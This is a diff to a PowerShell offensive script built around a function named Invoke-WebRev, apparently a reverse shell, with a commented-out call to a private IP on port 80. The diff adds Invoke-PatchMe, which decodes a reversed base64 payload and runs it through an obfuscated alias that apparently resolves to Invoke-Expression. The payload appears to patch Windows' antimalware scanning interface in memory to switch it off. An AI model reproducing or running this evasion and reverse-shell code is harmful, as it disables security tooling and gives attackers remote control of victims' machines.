@@ -117,4 +117,13 @@ function Invoke-WebRev{
     };
 }
 
-Invoke-WebRev -ip 192.168.29.131 -port 80
+function Invoke-PatchMe
+{
+    $base64 = "==QK2ACLzNXZyRGZBRCIsADIsg2Y0FGUkgSew92Q6oTXsFGazJXYN5yclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5N1WK0QKzMEewACLwgDewACL3ADewACLwADewACL3UDewACL4IEewgCId11WlRXeCtFI9ACajRXYQRiCNwGb15UL0V3TgwHIpAHJdZWZytFIsADN4BDIsUTXyMDdulWdbBCLzNXZyRGZBRCK0NWZ09mcQxWY1RncpZlO601czFGbDlXTbpQDwASPgAHJK0QKiIXZmZWdCJCIrAiIuF2YTJCIrAiIpNXbBJCIsknchJnYpxEZh9GTkgyczVmckRWQj9mcQRXZHpjOdN3chx2Q510Wg0DIzNXZyRGZBRiCNkiIsxGZuk2ciAyKgISbhJCK5JXYyJWaMRWYvxkO601czFGbDlXTbBSPgknchJnYpxEZh9GTkoQDK0wczFGbDlXTkASZwlHVtQGZBpQDK0AQioQD9pQDK0wOpQ3YlR3byBFZs9EbmBHbgQnbpVHI0V3bgwCdjVGdvJHU3VmTsZGI05Wa1BCLlpXaTdHZgIHdQRnbJVFIsM3clJHZkFEcsBic0BFdulEK0NWZ09mcQxWY1RncpZFIs92biBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCN0VKiIzMsVmbyV2aigCdy9GctlEbsR0WgACIgoQDK0wOpUWbh5GIn5WayR3coknchJnYpxEZh9GTgIHdQRnbJBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCN0VKiIzMsVmbyV2aigCdy9GctlEbsR0WgACIgoQDK0wOpUWbh50YvJHcgcmbpJHdzBCLlxWdk9WToBic0BFdulEKzNXZyRGZBN2byBFdldEIyRHU05WSg4mclRHelByYpRXY0NHIjlGbiVHcgACIgoQDdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIK0gCNsHIzNXYsNUeNByczFGbjByYpxmY1BnCNoQD7MXZjlmdyV2Uw9mclRnbJ5SZtlGduVnUu0WZ0NXeTByZul2c1pQD70WZ0NXeTByZul2c1pQDiAEI9AyczFGbDlXTkoQDK0AbsVnbkASPgM3chx2Q51EJ";
+    $base64array = $base64.ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null;
+    $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"));
+    $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
+    taleska-ei-vrixeka $base64string | Out-Null;
+}
+
+#Invoke-WebRev -ip 192.168.29.131 -port 80
